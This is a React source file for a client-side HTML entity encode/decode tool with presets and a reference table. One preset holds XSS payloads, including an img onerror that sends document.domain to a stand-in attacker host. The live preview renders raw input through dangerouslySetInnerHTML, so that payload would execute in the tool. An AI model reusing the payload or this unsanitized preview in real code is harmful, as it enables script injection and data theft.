import React, { useState, useMemo, useRef } from 'react';
import {
  FileCode,
  Copy,
  Check,
  Download,
  Upload,
  Trash2,
  Sparkles,
  Layers,
  ArrowRightLeft,
  CheckCheck,
  Zap,
  Eye,
  Sliders,
  Table,
  ShieldCheck,
  HelpCircle,
  Code2
} from 'lucide-react';
import { encodeHtmlEntities, decodeHtmlEntities, HtmlEntityOptions } from './devHelpers';

interface HtmlEntityCodecPanelProps {
  initialDirection?: 'encode' | 'decode';
  initialValue?: string;
}

const PRESETS: Record<
  string,
  { label: string; raw: string; encoded: string; description: string }
> = {
  'HTML Markup & Quotes': {
    label: 'HTML Tags & Quoted Attributes',
    raw: '<div id="main-container" class=\'dark-theme\'>\n  <h1 title="Welcome & Greetings">Toolstrum &amp; Co.</h1>\n  <p>Offline "Privacy-First" Utilities & tools for <developers>.</p>\n</div>',
    encoded: '&lt;div id=&quot;main-container&quot; class=&#39;dark-theme&#39;&gt;\n  &lt;h1 title=&quot;Welcome &amp; Greetings&quot;&gt;Toolstrum &amp;amp; Co.&lt;/h1&gt;\n  &lt;p&gt;Offline &quot;Privacy-First&quot; Utilities &amp; tools for &lt;developers&gt;.&lt;/p&gt;\n&lt;/div&gt;',
    description: 'HTML structure with angle brackets, double quotes, single quotes, and ampersands.'
  },
  'Copyright & Currency': {
    label: 'Copyright, Trademarks & Currency Symbols',
    raw: '© 2026 Toolstrum™ Inc. All rights reserved. Registered ® brand.\nPricing: €19.99 / £16.50 / ¥2,800 / $21.00 ± 5% tax.',
    encoded: '&copy; 2026 Toolstrum&trade; Inc. All rights reserved. Registered &reg; brand.\nPricing: &euro;19.99 / &pound;16.50 / &yen;2,800 / $21.00 &plusmn; 5% tax.',
    description: 'International typography, trademarks, and currency symbols.'
  },
  'Math & Typography': {
    label: 'Math Operators & Typographic Quotes',
    raw: '“Smart quotes” & ‘single quotes’ — em-dash and – en-dash…\nEquations: 10 × 5 ÷ 2 ≠ 20 • x ≤ y • a ≥ b • 90° angle.',
    encoded: '&ldquo;Smart quotes&rdquo; &amp; &lsquo;single quotes&rsquo; &mdash; em-dash and &ndash; en-dash&hellip;\nEquations: 10 &times; 5 &divide; 2 &#8800; 20 &bull; x &#8804; y &#8226; a &#8805; b &#8226; 90&deg; angle.',
    description: 'Curly quotes, dashes, ellipsis, bullet points, and math symbols.'
  },
  'XSS Defense Test': {
    label: 'Security / XSS Attack Vector Payload',
    raw: '<script>alert(document.cookie);</script>\n<img src=x onerror="fetch(\'https://attacker.com/steal?data=\'+document.domain)" />\n<a href="javascript:void(0)" onclick="evil()">Click Here</a>',
    encoded: '&lt;script&gt;alert(document.cookie);&lt;/script&gt;\n&lt;img src=x onerror=&quot;fetch(&#39;https://attacker.com/steal?data=&#39;+document.domain)&quot; /&gt;\n&lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;evil()&quot;&gt;Click Here&lt;/a&gt;',
    description: 'Dangerous script injection vectors that must be safely escaped before browser rendering.'
  }
};

const COMMON_ENTITIES = [
  { char: '&', name: '&amp;', dec: '&#38;', hex: '&#x26;', desc: 'Ampersand' },
  { char: '<', name: '&lt;', dec: '&#60;', hex: '&#x3c;', desc: 'Less than' },
  { char: '>', name: '&gt;', dec: '&#62;', hex: '&#x3e;', desc: 'Greater than' },
  { char: '"', name: '&quot;', dec: '&#34;', hex: '&#x22;', desc: 'Double quote' },
  { char: "'", name: '&#39;', dec: '&#39;', hex: '&#x27;', desc: 'Single quote / apostrophe' },
  { char: '©', name: '&copy;', dec: '&#169;', hex: '&#xa9;', desc: 'Copyright' },
  { char: '®', name: '&reg;', dec: '&#174;', hex: '&#xae;', desc: 'Registered' },
  { char: '™', name: '&trade;', dec: '&#8482;', hex: '&#x2122;', desc: 'Trademark' },
  { char: '€', name: '&euro;', dec: '&#8364;', hex: '&#x20ac;', desc: 'Euro' },
  { char: '£', name: '&pound;', dec: '&#163;', hex: '&#xa3;', desc: 'Pound' },
  { char: '¥', name: '&yen;', dec: '&#165;', hex: '&#xa5;', desc: 'Yen' },
  { char: '°', name: '&deg;', dec: '&#176;', hex: '&#xb0;', desc: 'Degree' },
  { char: '±', name: '&plusmn;', dec: '&#177;', hex: '&#xb1;', desc: 'Plus-minus' },
  { char: '×', name: '&times;', dec: '&#215;', hex: '&#xd7;', desc: 'Multiply' },
  { char: '÷', name: '&divide;', dec: '&#247;', hex: '&#xf7;', desc: 'Divide' },
  { char: '•', name: '&bull;', dec: '&#8226;', hex: '&#x2022;', desc: 'Bullet point' },
  { char: '…', name: '&hellip;', dec: '&#8230;', hex: '&#x2026;', desc: 'Ellipsis' },
  { char: '—', name: '&mdash;', dec: '&#8212;', hex: '&#x2014;', desc: 'Em-dash' }
];

export const HtmlEntityCodecPanel: React.FC<HtmlEntityCodecPanelProps> = ({
  initialDirection = 'encode',
  initialValue
}) => {
  const [direction, setDirection] = useState<'encode' | 'decode'>(initialDirection);
  const [input, setInput] = useState<string>(
    initialValue ??
      (initialDirection === 'encode'
        ? PRESETS['HTML Markup & Quotes'].raw
        : PRESETS['HTML Markup & Quotes'].encoded)
  );
  const [mode, setMode] = useState<'named' | 'decimal' | 'hex'>('named');
  const [scope, setScope] = useState<'special' | 'extended' | 'all'>('special');
  const [showPreview, setShowPreview] = useState(false);
  const [activeTab, setActiveTab] = useState<'output' | 'entities' | 'cheatsheet'>('output');
  const [copied, setCopied] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Compute processed output
  const output = useMemo(() => {
    if (!input) return '';
    if (direction === 'encode') {
      return encodeHtmlEntities(input, { mode, scope });
    } else {
      return decodeHtmlEntities(input);
    }
  }, [input, direction, mode, scope]);

  // Detected entities analysis
  const detectedEntities = useMemo(() => {
    if (!input) return [];
    const textToScan = direction === 'encode' ? output : input;
    const regex = /&[a-zA-Z0-9#]+;/g;
    const found: Array<{ rawEntity: string; decodedChar: string; count: number }> = [];
    const map = new Map<string, number>();

    let match: RegExpExecArray | null;
    while ((match = regex.exec(textToScan)) !== null) {
      const ent = match[0];
      map.set(ent, (map.get(ent) || 0) + 1);
    }

    map.forEach((count, rawEntity) => {
      const decodedChar = decodeHtmlEntities(rawEntity);
      found.push({ rawEntity, decodedChar, count });
    });

    return found;
  }, [input, output, direction]);

  const handleCopy = async (text: string) => {
    if (!text) return;
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // fallback
    }
  };

  const handleSwap = () => {
    const nextDir = direction === 'encode' ? 'decode' : 'encode';
    const nextVal = output || input;
    setDirection(nextDir);
    setInput(nextVal);
  };

  const handleClear = () => {
    setInput('');
  };

  const handleDownload = () => {
    if (!output) return;
    const blob = new Blob([output], { type: 'text/html;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = direction === 'encode' ? 'encoded-entities.html' : 'decoded-output.html';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (evt) => {
      const text = evt.target?.result;
      if (typeof text === 'string') {
        setInput(text);
      }
    };
    reader.readAsText(file);
    if (fileInputRef.current) fileInputRef.current.value = '';
  };

  const loadPreset = (presetKey: string) => {
    const p = PRESETS[presetKey];
    if (!p) return;
    setInput(direction === 'encode' ? p.raw : p.encoded);
  };

  return (
    <div className="space-y-6">
      {/* Header bar */}
      <div className="flex flex-wrap items-center justify-between gap-4 p-4 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-sky-50 dark:bg-sky-950/60 flex items-center justify-center text-sky-600 dark:text-sky-400 font-bold border border-sky-200/50 dark:border-sky-800/40">
            &amp;
          </div>
          <div>
            <h2 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
              HTML Entity Codec
              <span className="text-xs px-2 py-0.5 rounded-full bg-emerald-50 dark:bg-emerald-950/60 text-emerald-600 dark:text-emerald-400 border border-emerald-200 dark:border-emerald-800/40 font-mono">
                100% Offline Client-Side
              </span>
            </h2>
            <p className="text-xs text-slate-500 dark:text-slate-400">
              Bi-directional HTML entity escaping and unescaping with named, decimal, and hex representations.
            </p>
          </div>
        </div>

        {/* Direction toggles */}
        <div className="flex items-center gap-2">
          <div className="flex p-1 rounded-xl bg-slate-100 dark:bg-slate-800/80 border border-slate-200 dark:border-slate-700">
            <button
              onClick={() => setDirection('encode')}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                direction === 'encode'
                  ? 'bg-white dark:bg-slate-900 text-sky-600 dark:text-sky-400 shadow-xs'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
              }`}
            >
              Encode (to Entities)
            </button>
            <button
              onClick={() => setDirection('decode')}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                direction === 'decode'
                  ? 'bg-white dark:bg-slate-900 text-sky-600 dark:text-sky-400 shadow-xs'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
              }`}
            >
              Decode (from Entities)
            </button>
          </div>

          <button
            onClick={handleSwap}
            title="Swap input and output and flip direction"
            className="p-2 rounded-xl border border-slate-200 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-600 dark:text-slate-300 transition-colors"
          >
            <ArrowRightLeft className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Preset Pills */}
      <div className="flex flex-wrap items-center gap-2">
        <span className="text-xs font-semibold text-slate-500 dark:text-slate-400 flex items-center gap-1.5 mr-1">
          <Sparkles className="w-3.5 h-3.5 text-amber-500" /> Presets:
        </span>
        {Object.keys(PRESETS).map((key) => (
          <button
            key={key}
            onClick={() => loadPreset(key)}
            className="px-2.5 py-1 rounded-lg text-xs font-medium border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 hover:border-sky-500 hover:text-sky-600 dark:hover:text-sky-400 transition-colors text-slate-600 dark:text-slate-400"
          >
            {PRESETS[key].label}
          </button>
        ))}
      </div>

      {/* Controls Bar (Options when Encoding) */}
      {direction === 'encode' && (
        <div className="p-4 rounded-xl bg-slate-50 dark:bg-slate-850/60 border border-slate-200 dark:border-slate-800 flex flex-wrap items-center justify-between gap-4">
          <div className="flex flex-wrap items-center gap-6 text-xs">
            {/* Format Mode */}
            <div className="flex items-center gap-2">
              <span className="font-semibold text-slate-700 dark:text-slate-300">Format:</span>
              <div className="flex items-center gap-3">
                <label className="flex items-center gap-1.5 cursor-pointer">
                  <input
                    type="radio"
                    name="entity-format"
                    checked={mode === 'named'}
                    onChange={() => setMode('named')}
                    className="accent-sky-600"
                  />
                  <span className="text-slate-600 dark:text-slate-400">Named (&amp;copy;)</span>
                </label>
                <label className="flex items-center gap-1.5 cursor-pointer">
                  <input
                    type="radio"
                    name="entity-format"
                    checked={mode === 'decimal'}
                    onChange={() => setMode('decimal')}
                    className="accent-sky-600"
                  />
                  <span className="text-slate-600 dark:text-slate-400">Decimal (&amp;#169;)</span>
                </label>
                <label className="flex items-center gap-1.5 cursor-pointer">
                  <input
                    type="radio"
                    name="entity-format"
                    checked={mode === 'hex'}
                    onChange={() => setMode('hex')}
                    className="accent-sky-600"
                  />
                  <span className="text-slate-600 dark:text-slate-400">Hex (&amp;#xa9;)</span>
                </label>
              </div>
            </div>

            {/* Scope */}
            <div className="flex items-center gap-2">
              <span className="font-semibold text-slate-700 dark:text-slate-300">Scope:</span>
              <div className="flex items-center gap-3">
                <label className="flex items-center gap-1.5 cursor-pointer">
                  <input
                    type="radio"
                    name="entity-scope"
                    checked={scope === 'special'}
                    onChange={() => setScope('special')}
                    className="accent-sky-600"
                  />
                  <span className="text-slate-600 dark:text-slate-400">HTML Special (&lt;, &gt;, &amp;, &quot;, &apos;)</span>
                </label>
                <label className="flex items-center gap-1.5 cursor-pointer">
                  <input
                    type="radio"
                    name="entity-scope"
                    checked={scope === 'extended'}
                    onChange={() => setScope('extended')}
                    className="accent-sky-600"
                  />
                  <span className="text-slate-600 dark:text-slate-400">Extended / Non-ASCII</span>
                </label>
                <label className="flex items-center gap-1.5 cursor-pointer">
                  <input
                    type="radio"
                    name="entity-scope"
                    checked={scope === 'all'}
                    onChange={() => setScope('all')}
                    className="accent-sky-600"
                  />
                  <span className="text-slate-600 dark:text-slate-400">All Non-Alphanumeric</span>
                </label>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Editor & Viewer Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Input Column */}
        <div className="flex flex-col rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs overflow-hidden">
          <div className="flex items-center justify-between px-4 py-3 border-b border-slate-200 dark:border-slate-800 bg-slate-50/50 dark:bg-slate-850/40">
            <div className="flex items-center gap-2">
              <Code2 className="w-4 h-4 text-sky-600 dark:text-sky-400" />
              <span className="text-xs font-bold uppercase tracking-wider text-slate-800 dark:text-slate-200">
                {direction === 'encode' ? 'Raw HTML / Text Input' : 'HTML Entities Input'}
              </span>
              <span className="text-xs text-slate-400 font-mono">
                ({input.length} chars)
              </span>
            </div>
            <div className="flex items-center gap-1.5">
              <input
                ref={fileInputRef}
                type="file"
                className="hidden"
                accept=".txt,.html,.htm,.svg,.xml"
                onChange={handleFileUpload}
              />
              <button
                onClick={() => fileInputRef.current?.click()}
                className="p-1.5 rounded-lg text-slate-500 hover:text-slate-900 dark:hover:text-white hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors"
                title="Upload file"
              >
                <Upload className="w-3.5 h-3.5" />
              </button>
              <button
                onClick={handleClear}
                className="p-1.5 rounded-lg text-slate-500 hover:text-rose-600 hover:bg-slate-100 dark:hover:bg-slate-800 transition-colors"
                title="Clear input"
              >
                <Trash2 className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>

          <textarea
            value={input}
            onChange={(e) => setInput(e.target.value)}
            placeholder={
              direction === 'encode'
                ? 'Enter or paste HTML tags, quotes, or characters to escape...'
                : 'Enter or paste HTML entities (e.g. &amp;copy;, &amp;lt;, &#38;)...'
            }
            className="flex-1 min-h-[360px] p-4 bg-transparent font-mono text-xs text-slate-900 dark:text-slate-100 resize-none focus:outline-hidden leading-relaxed"
            spellCheck={false}
          />
        </div>

        {/* Output Column */}
        <div className="flex flex-col rounded-2xl bg-white dark:bg-slate-900 border-2 border-sky-500/30 shadow-md overflow-hidden">
          <div className="flex items-center justify-between px-4 py-2.5 border-b border-slate-200 dark:border-slate-800 bg-slate-50/50 dark:bg-slate-850/40">
            <div className="flex items-center gap-2">
              <div className="flex p-0.5 rounded-lg bg-slate-200 dark:bg-slate-800 text-xs font-semibold">
                <button
                  onClick={() => setActiveTab('output')}
                  className={`px-2.5 py-1 rounded-md transition-colors ${
                    activeTab === 'output'
                      ? 'bg-white dark:bg-slate-900 text-sky-600 dark:text-sky-400 shadow-xs'
                      : 'text-slate-600 dark:text-slate-400'
                  }`}
                >
                  Output ({output.length} chars)
                </button>
                <button
                  onClick={() => setActiveTab('entities')}
                  className={`px-2.5 py-1 rounded-md transition-colors flex items-center gap-1 ${
                    activeTab === 'entities'
                      ? 'bg-white dark:bg-slate-900 text-sky-600 dark:text-sky-400 shadow-xs'
                      : 'text-slate-600 dark:text-slate-400'
                  }`}
                >
                  <Table className="w-3 h-3" />
                  Entities ({detectedEntities.length})
                </button>
                <button
                  onClick={() => setActiveTab('cheatsheet')}
                  className={`px-2.5 py-1 rounded-md transition-colors flex items-center gap-1 ${
                    activeTab === 'cheatsheet'
                      ? 'bg-white dark:bg-slate-900 text-sky-600 dark:text-sky-400 shadow-xs'
                      : 'text-slate-600 dark:text-slate-400'
                  }`}
                >
                  <HelpCircle className="w-3 h-3" />
                  Reference
                </button>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => setShowPreview(!showPreview)}
                className={`px-2.5 py-1 rounded-lg text-xs font-medium border flex items-center gap-1.5 transition-colors ${
                  showPreview
                    ? 'bg-sky-50 dark:bg-sky-950/50 border-sky-300 dark:border-sky-700 text-sky-600 dark:text-sky-400'
                    : 'border-slate-200 dark:border-slate-700 text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
                }`}
              >
                <Eye className="w-3.5 h-3.5" />
                {showPreview ? 'Hide Browser Preview' : 'Live Browser Preview'}
              </button>
              <button
                onClick={() => handleCopy(output)}
                className="px-3 py-1 rounded-lg bg-sky-600 hover:bg-sky-700 text-white text-xs font-semibold flex items-center gap-1.5 shadow-xs transition-colors"
              >
                {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copied ? 'Copied' : 'Copy'}</span>
              </button>
              <button
                onClick={handleDownload}
                className="p-1.5 rounded-lg border border-slate-200 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-600 dark:text-slate-300 transition-colors"
                title="Download output file"
              >
                <Download className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>

          {/* Active Tab: Output */}
          {activeTab === 'output' && (
            <div className="flex-1 flex flex-col min-h-[360px]">
              <pre className="flex-1 p-4 bg-slate-50/50 dark:bg-slate-950/50 font-mono text-xs text-slate-900 dark:text-slate-100 whitespace-pre-wrap break-all select-all overflow-y-auto leading-relaxed">
                {output || (
                  <span className="text-slate-400 italic">
                    Output will appear here automatically...
                  </span>
                )}
              </pre>

              {/* Rendered Browser Preview (optional expander) */}
              {showPreview && (
                <div className="border-t border-slate-200 dark:border-slate-800 p-4 bg-white dark:bg-slate-900">
                  <div className="flex items-center gap-1.5 mb-2 text-xs font-bold text-slate-700 dark:text-slate-300">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
                    Live Rendered HTML View:
                  </div>
                  <div
                    className="p-3 rounded-xl bg-slate-100/70 dark:bg-slate-800/70 border border-slate-200 dark:border-slate-700 text-xs text-slate-800 dark:text-slate-200 leading-relaxed font-sans min-h-[60px]"
                    dangerouslySetInnerHTML={{
                      __html: direction === 'encode' ? input : output
                    }}
                  />
                </div>
              )}
            </div>
          )}

          {/* Active Tab: Entities Inspector */}
          {activeTab === 'entities' && (
            <div className="flex-1 p-4 bg-slate-50/50 dark:bg-slate-950/50 overflow-y-auto max-h-[460px]">
              {detectedEntities.length === 0 ? (
                <div className="h-48 flex flex-col items-center justify-center text-slate-400 text-xs">
                  <p>No HTML entities detected in the current text.</p>
                </div>
              ) : (
                <table className="w-full text-xs text-left">
                  <thead>
                    <tr className="border-b border-slate-200 dark:border-slate-800 text-slate-400 uppercase font-bold">
                      <th className="pb-2">Char</th>
                      <th className="pb-2 font-mono">Entity</th>
                      <th className="pb-2 font-mono">Hex Code</th>
                      <th className="pb-2 font-mono">Dec Code</th>
                      <th className="pb-2 text-right">Count</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-850">
                    {detectedEntities.map((ent, i) => (
                      <tr key={i} className="hover:bg-slate-100/50 dark:hover:bg-slate-800/50">
                        <td className="py-2.5 font-bold text-sky-600 dark:text-sky-400 text-sm">
                          {ent.decodedChar}
                        </td>
                        <td className="py-2.5 font-mono text-slate-800 dark:text-slate-200">
                          {ent.rawEntity}
                        </td>
                        <td className="py-2.5 font-mono text-slate-500">
                          &#38;#x{ent.decodedChar.charCodeAt(0).toString(16)};
                        </td>
                        <td className="py-2.5 font-mono text-slate-500">
                          &#38;#{ent.decodedChar.charCodeAt(0)};
                        </td>
                        <td className="py-2.5 text-right font-semibold text-slate-700 dark:text-slate-300">
                          {ent.count}×
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          )}

          {/* Active Tab: Common Entities Reference */}
          {activeTab === 'cheatsheet' && (
            <div className="flex-1 p-4 bg-slate-50/50 dark:bg-slate-950/50 overflow-y-auto max-h-[460px]">
              <table className="w-full text-xs text-left">
                <thead>
                  <tr className="border-b border-slate-200 dark:border-slate-800 text-slate-400 uppercase font-bold">
                    <th className="pb-2">Symbol</th>
                    <th className="pb-2">Name</th>
                    <th className="pb-2 font-mono">Named</th>
                    <th className="pb-2 font-mono">Decimal</th>
                    <th className="pb-2 text-right">Action</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 dark:divide-slate-850">
                  {COMMON_ENTITIES.map((item, idx) => (
                    <tr key={idx} className="hover:bg-slate-100/50 dark:hover:bg-slate-800/50">
                      <td className="py-2 font-bold text-sky-600 dark:text-sky-400 text-sm">
                        {item.char}
                      </td>
                      <td className="py-2 text-slate-700 dark:text-slate-300 font-medium">
                        {item.desc}
                      </td>
                      <td className="py-2 font-mono text-slate-800 dark:text-slate-200">
                        {item.name}
                      </td>
                      <td className="py-2 font-mono text-slate-500">
                        {item.dec}
                      </td>
                      <td className="py-2 text-right">
                        <button
                          onClick={() => setInput((prev) => prev + item.name)}
                          className="px-2 py-0.5 rounded text-[11px] bg-slate-200 dark:bg-slate-800 hover:bg-sky-500 hover:text-white transition-colors"
                        >
                          + Insert
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
